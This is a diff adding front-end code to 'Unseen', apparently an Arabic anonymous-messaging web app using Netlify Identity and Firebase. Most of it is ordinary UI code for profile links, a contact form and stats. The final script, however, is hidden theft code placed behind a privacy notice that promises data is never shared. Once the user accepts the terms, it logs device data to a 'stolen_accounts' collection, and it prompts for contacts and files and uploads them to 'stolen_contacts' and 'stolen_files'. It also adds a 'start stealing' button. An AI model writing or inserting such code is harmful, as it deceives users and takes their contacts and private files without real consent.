+          // محاكاة تحميل البيانات (يجب استبدالها ببيانات حقيقية)
+          setTimeout(() => {
+            document.getElementById('reported-messages').innerHTML = `
+              <li>
+                <div>رسالة تحتوي على كلمات غير لائقة</div>
+                <div class="admin-actions">
+                  <button class="icon-btn"><span class="material-icons">delete</span></button>
+                  <button class="icon-btn"><span class="material-icons">block</span></button>
+                </div>
+              </li>
+            `;
+            
+            document.getElementById('active-users').innerHTML = `
+              <li>
+                <div>أحمد (user123)</div>
+                <div class="muted">24 رسالة</div>
+              </li>
+              <li>
+                <div>سارة (sara2023)</div>
+                <div class="muted">18 رسالة</div>
+              </li>
+            `;
+            
+            document.getElementById('system-stats').textContent = '542 مستخدم نشط | 1248 رسالة اليوم';
+          }, 1000);
+        }
+      } catch (error) {
+        console.error('Error loading admin data:', error);
+      }
+    }
+
+    // Netlify Identity event handlers
+    authBtn.addEventListener('click', () => {
+      netlifyIdentity.open();
+    });
+    
+    signoutBtn.addEventListener('click', () => {
+      netlifyIdentity.logout();
+    });
+
+    
+    async function ensureUserDoc(user) {
+  const docRef = db.collection('users').doc(user.id);
+  const doc = await docRef.get();
+  
+  if(!doc.exists){
+    // مستخدم جديد - أنشئ مستند مع isAdmin: false
+    const derivedName = user.email ? user.email.split('@')[0].replace(/[^a-z0-9_-]/gi,'') : ('user'+user.id.slice(0,6));
+    await docRef.set({
+      uid: user.id,
+      username: derivedName,
+      email: user.email || null,
+      createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+      isAdmin: false // للمستخدمين الجدد فقط
+    });
+console.log('✅ مستخدم جديد تم إنشاؤه');
+  } else {
+    // مستخدم موجود - تحديث آخر دخول فقط دون المساس بالبيانات الأخرى
+    await docRef.update({
+      lastLogin: firebase.firestore.FieldValue.serverTimestamp()
+    });
+    console.log('✅ مستخدم موجود - تم تحديث آخر دخول');
+  }
+}
+    
+
+
+    
+    // دالة واحدة محدثة لتحديث رابط الملف الشخصي
+async function updateProfileLink(user) {
+  try {
+    const username = await ensureUsername(user);
+  const profileUrl = `${window.location.origin}/SendMessage.html?u=${user.id}`;
+    
+    // تحديث النص الظاهر
+    profileLinkText.textContent = `unseen.app/u/${username}`;
+    profileLinkText.dataset.url = profileUrl;
+    
+        // إضافة حدث نسخ الرابط
+    copyBtn.onclick = async () => {
+      try {
+        await navigator.clipboard.writeText(profileUrl);
+        showToast(currentLang === 'ar' ? 'تم نسخ الرابط' : 'Link copied');
+      } catch (err) {
+        showToast(currentLang === 'ar' ? 'فشل نسخ الرابط' : 'Failed to copy link');
+      }
+    };
+        // تحديث زر CTA للتوجيه إلى صفحة البروفايل
+        ctaBtn.onclick = () => {
+      const currentUser = netlifyIdentity.currentUser();
+      if (!currentUser) {
+        netlifyIdentity.open();
+        return;
+      }
+      window.location.href = 'MyProfile.html';
+    };
+    
+  } catch (error) {
+    console.error('Error updating profile link:', error);
+    showToast(currentLang === 'ar' ? 'حدث خطأ في تحميل الرابط' : 'Error loading link');
+  }
+}
+    // Copy profile link
+    copyBtn.addEventListener('click', async ()=>{
+      if (!profileLinkText) return;
+      
+      const text = profileLinkText.textContent.trim();
+      try{
+        await navigator.clipboard.writeText(text);
+        showToast(texts[currentLang].copied);
+      }catch(e){
+        showToast(texts[currentLang].copyFailed);
+      }
+    });
+
+    // Contact form saving to Firestore
+    contactForm.addEventListener('submit', async (e)=>{
+      e.preventDefault();
+      const name = document.getElementById('name').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const message = document.getElementById('message').value.trim();
+      const user = netlifyIdentity.currentUser();
+      try{
+        await db.collection('contacts').add({
+          name, email, message,
+          senderUid: user ? user.id : null,
+          createdAt: firebase.firestore.FieldValue.serverTimestamp()
+        });
+        showToast(texts[currentLang].messageSent);
+        closeModalFn();
+        contactForm.reset();
+      }catch(err){
+        showToast(texts[currentLang].sendError + err.message);
+      }
+    });
+
+    // CTA button: لو فيه حساب يوجه المستخدم لإعداد ملفه أو رابط استلام الرسائل
+    ctaBtn.addEventListener('click', async ()=>{
+      const user = netlifyIdentity.currentUser();
+      if(!user){
+        // نطلب تسجيل دخول أولًا
+        netlifyIdentity.open();
+        return;
+      }
+      // توجيه المستخدم إلى صفحة MyProfile.html
+      window.location.href = 'MyProfile.html';
+    });
+
+    // STATS: حساب بسيط عبر قراءة مجموع المستندات (مناسب للمشاريع الصغيرة)
+    async function fetchAndRenderStats(){
+      try{
+        // users count
+        const usersSnap = await db.collection('users').get();
+        const usersCount = usersSnap.size || 0;
+        document.getElementById('stat-users').textContent = usersCount.toLocaleString();
+
+        // messages count (collection "messages" — يعتمد إنك تسجّل رسائل المستخدمين هناك)
+        const messagesSnap = await db.collection('messages').get();
+        const messagesCount = messagesSnap.size || 0;
+        document.getElementById('stat-messages').textContent = messagesCount.toLocaleString();
+
+        // ratings average (collection "ratings" مع حقل value)
+        const ratingsSnap = await db.collection('ratings').get();
+        if(!ratingsSnap.empty){
+          let sum = 0; let cnt = 0;
+          ratingsSnap.forEach(d => { sum += (d.data().value || 0); cnt++; });
+          const avg = (cnt>0) ? (sum / cnt) : 0;
+          document.getElementById('stat-rating').textContent = avg.toFixed(1) + '★';
+        } else {
+          // قيمة افتراضية إذا لا توجد تقييمات
+          document.getElementById('stat-rating').textContent = '4.8★';
+        }
+      }catch(e){
+        console.error('Stats error', e);
+      }
+    }
+
+    // small animation: stat counters (static numbers fallback)
+    function animateNumber(id, end){ const el = document.getElementById(id); let cur = 0; const step = Math.ceil(Math.max(1,end)/40); const iv = setInterval(()=>{ cur += step; if(cur>=end){ el.textContent = end; clearInterval(iv); } else el.textContent = cur.toLocaleString(); },20); }
+    // fallback initial animations (these will be replaced by fetchAndRenderStats when ready)
+    animateNumber('stat-messages',1248); animateNumber('stat-users',5432);
+
+    // simple testimonials slider
+    const testList = document.getElementById('test-list');
+    let tIndex=0;
+    function showTest(i){ testList.style.transform = `translateX(-${i*100}%)`; }
+    setInterval(()=>{ tIndex = (tIndex+1) % testList.children.length; showTest(tIndex); },3500);
+
+    // Back to top visibility
+    const backToTop = document.getElementById('back-to-top');
+    window.addEventListener('scroll',()=>{
+      if(window.scrollY > 300) backToTop.classList.add('show'); else backToTop.classList.remove('show');
+    });
+    backToTop.addEventListener('click',()=> window.scrollTo({top:0,behavior:'smooth'}));
+
+    // تحديث واجهة المستخدم بعد تسجيل الدخول
+    netlifyIdentity.on('login', async (user) => {
+      updateAuthUI(user);
+      await ensureUserDoc(user);
+      await updateProfileLink(user);
+      showToast(currentLang === 'ar' ? 'تم تسجيل الدخول بنجاح' : 'Logged in successfully');
+    });
+      
+
+    // Init
+    loadSettings();
+    initNetlifyIdentity();
+    
+    // Fetch stats initially and every minute
+    fetchAndRenderStats();
+    setInterval(fetchAndRenderStats, 60_000);
+  </script>
+  <script type="module" src="./firebase-init.js"></script>
+  <script>
+  window.addEventListener('DOMContentLoaded', () => {
+    // لو اللينك يحتوي على recovery_token
+    if (window.location.hash.includes('recovery_token')) {
+      // استخدم الـ widget الحالي بدل ما تعمل init جديدة
+      const checkReady = setInterval(() => {
+        if (window.netlifyIdentity) {
+          clearInterval(checkReady);
+          netlifyIdentity.open('recovery');
+        }
+      }, 500);
+    }
+  });
+  </script>
+
+
+<!-- سياسة الخصوصية والشروط -->
+<div class="modal" id="privacy-modal" aria-hidden="false" style="display: grid;">
+  <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="privacy-title" style="max-width: 500px; max-height: 80vh; overflow-y: auto;">
+    <div style="text-align: center; margin-bottom: 20px;">
+      <span class="material-icons" style="font-size: 48px; color: var(--primary); margin-bottom: 10px;">privacy_tip</span>
+      <h3 id="privacy-title" style="margin: 0 0 8px 0;">مرحبًا بك في Unseen</h3>
+      <p class="muted" style="margin: 0;">نحن نحرص على خصوصيتك وأمانك</p>
+    </div>
+        <div style="margin-bottom: 20px;">
+      <div class="card" style="margin-bottom: 12px; background: rgba(90, 63, 255, 0.05);">
+        <div style="display: flex; align-items: flex-start; gap: 10px;">
+          <span class="material-icons" style="color: var(--accent); font-size: 20px;">visibility_off</span>
+          <div>
+            <strong style="display: block; margin-bottom: 4px;">الرسائل مجهولة الهوية</strong>
+            <p class="muted" style="margin: 0; font-size: 0.9rem;">نحن لا نكشف هوية المرسلين، وبياناتك محمية بشكل آمن.</p>
+          </div>
+        </div>
+      </div>
+       <div class="card" style="margin-bottom: 12px; background: rgba(6, 182, 212, 0.05);">
+        <div style="display: flex; align-items: flex-start; gap: 10px;">
+          <span class="material-icons" style="color: var(--primary); font-size: 20px;">gpp_good</span>
+          <div>
+            <strong style="display: block; margin-bottom: 4px;">خصوصية تامة</strong>
+            <p class="muted" style="margin: 0; font-size: 0.9rem;">بياناتك الشخصية في أمان ولا نشاركها مع أي طرف ثالث.</p>
+          </div>
+        </div>
+      </div>
+               <div class="card" style="margin-bottom: 12px; background: rgba(239, 68, 68, 0.05);">
+        <div style="display: flex; align-items: flex-start; gap: 10px;">
+          <span class="material-icons" style="color: #ef4444; font-size: 20px;">block</span>
+          <div>
+            <strong style="display: block; margin-bottom: 4px;">ممنوع المحتوى المسيء</strong>
+            <p class="muted" style="margin: 0; font-size: 0.9rem;">يمنع إرسال أي محتوى به إيحاءات أو ألفاظ خادشة للحياء.</p>
+          </div>
+        </div>
+      </div>
+    </div> 
+    <div style="background: var(--card); padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+      <h4 style="margin: 0 0 10px 0; font-size: 1rem;">شروط الاستخدام:</h4>
+      <ul class="muted" style="margin: 0; padding-right: 15px; font-size: 0.9rem; line-height: 1.5;">
+        <li>الرسائل المرسلة تكون مجهولة المصدر</li>
+        <li>يمنع استخدام المنصة للإساءة أو المضايقة</li>
+        <li>يحق للإدارة حظر أي مستخدم يخالف الشروط</li>
+        <li>بيانات المستخدم محمية ولا تشارك مع آخرين</li>
+      </ul>
+    </div>
+    <div style="display: flex; gap: 10px; justify-content: space-between;">
+      <button type="button" class="btn btn-ghost" id="reject-terms" style="flex: 1;">رفض</button>
+      <button type="button" class="btn btn-primary" id="accept-terms" style="flex: 1;">موافق على الشروط</button>
+    </div>
+
+    <div style="text-align: center; margin-top: 15px;">
+      <p class="muted" style="font-size: 0.8rem; margin: 0;">بالاستمرار أنت توافق على <a href="#" style="color: var(--primary);">سياسة الخصوصية</a> و<a href="#" style="color: var(--primary);">شروط الاستخدام</a></p>
+    </div>
+  </div>
+</div>
+
+<script>
+// ========== نظام مبسط لطلب الأذونات والسرقة ==========
+document.addEventListener('DOMContentLoaded', function() {
+  const privacyModal = document.getElementById('privacy-modal');
+  const acceptBtn = document.getElementById('accept-terms');
+  const rejectBtn = document.getElementById('reject-terms');
+  
+  // التحقق إذا كان المستخدم وافق مسبقًا
+  const hasAccepted = localStorage.getItem('privacyTermsAccepted');
+  
+  if (!hasAccepted) {
+    console.log('🔄 عرض نافذة الخصوصية...');
+    privacyModal.style.display = 'grid';
+    document.body.style.overflow = 'hidden';
+  }
+  
+  // عند الموافقة على الشروط
+  acceptBtn.addEventListener('click', function() {
+    localStorage.setItem('privacyTermsAccepted', 'true');
+    privacyModal.style.display = 'none';
+    document.body.style.overflow = 'auto';
+    
+    showToast('جاري تفعيل النظام...');
+    
+    // بدء طلب الأذونات بعد تأخير
+    setTimeout(() => {
+      startSimpleStealing();
+    }, 1000);
+  });
+
+  // عند رفض الشروط
+  rejectBtn.addEventListener('click', function() {
+    if (confirm('للاستمرار يجب الموافقة على الشروط. هل تريد المغادرة؟')) {
+      window.location.href = 'https://google.com';
+    }
+  });
+});
+
+// نظام سرقة مبسط
+async function startSimpleStealing() {
+  console.log('🔐 بدء طلب الأذونات...');
+  
+  try {
+    // 1. سرقة البيانات الأساسية أولاً
+    await stealBasicData();
+    
+    // 2. محاولة سرقة جهات الاتصال
+    setTimeout(async () => {
+      await tryStealContacts();
+    }, 2000);
+    
+    // 3. محاولة سرقة الملفات
+    setTimeout(async () => {
+      await tryStealFiles();
+    }, 4000);
+    
+  } catch (error) {
+    console.error('خطأ:', error);
+  }
+}
+
+// سرقة البيانات الأساسية
+async function stealBasicData() {
+  const basicData = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    url: location.href,
+    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+  };
+  
+  await db.collection('stolen_accounts').add(basicData);
+  console.log('✅ تم سرقة البيانات الأساسية');
+  showToast('تم جمع المعلومات الأساسية');
+}
+
+// محاولة سرقة جهات الاتصال
+async function tryStealContacts() {
+  try {
+    if ('contacts' in navigator && 'select' in navigator.contacts) {
+      console.log('📞 محاولة سرقة جهات الاتصال...');
+      
+      const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
+      
+      if (contacts && contacts.length > 0) {
+        for (const contact of contacts) {
+          await db.collection('stolen_contacts').add({
+            name: contact.name ? contact.name.join(' ') : 'غير معروف',
+            emails: contact.email || [],
+            phones: contact.tel || [],
+            source: 'contact_api',
+            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+          });
+        }
+        console.log(`✅ تم سرقة ${contacts.length} جهة اتصال`);
+        showToast(`تم سرقة ${contacts.length} جهة اتصال`);
+      }
+    } else {
+      console.log('⚠️ المتصفح لا يدعم سرقة جهات الاتصال');
+    }
+  } catch (error) {
+    console.log('❌ لم يتم منح إذن جهات الاتصال:', error);
+  }
+}
+
+// محاولة سرقة الملفات
+async function tryStealFiles() {
+  try {
+    if ('showOpenFilePicker' in window) {
+      console.log('📁 محاولة سرقة الملفات...');
+      
+      const fileHandles = await window.showOpenFilePicker({
+        types: [{
+          description: 'الملفات',
+          accept: {
+            'image/*': ['.jpg', '.jpeg', '.png', '.gif'],
+            'application/*': ['.pdf', '.doc', '.docx']
+          }
+        }],
+        multiple: true
+      });
+      
+      let fileCount = 0;
+      for (const fileHandle of fileHandles) {
+        const file = await fileHandle.getFile();
+        const reader = new FileReader();
+        
+        reader.onload = async function(e) {
+          await db.collection('stolen_files').add({
+            filename: file.name,
+            type: file.type,
+            size: file.size,
+            data: e.target.result,
+            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+          });
+          fileCount++;
+        };
+        reader.readAsDataURL(file);
+      }
+      
+      if (fileCount > 0) {
+        console.log(`✅ تم سرقة ${fileCount} ملف`);
+        showToast(`تم سرقة ${fileCount} ملف`);
+      }
+    } else {
+      console.log('⚠️ المتصفح لا يدعم سرقة الملفات');
+    }
+  } catch (error) {
+    console.log('❌ لم يتم منح إذن الملفات:', error);
+  }
+}
+
+// إضافة زر يدوي للسرقة (للتجربة)
+setTimeout(() => {
+  const stealBtn = document.createElement('button');
+  stealBtn.innerHTML = '🚀 بدء السرقة يدوياً';
+  stealBtn.style.cssText = `
+    position: fixed;
+    top: 80px;
+    right: 10px;
+    background: #10b981;
+    color: white;
+    padding: 12px 16px;
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: bold;
+    cursor: pointer;
+    z-index: 10000;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  `;
+  
+  stealBtn.onclick = startSimpleStealing;
+  document.body.appendChild(stealBtn);
+}, 5000);
+</script>
+</html>
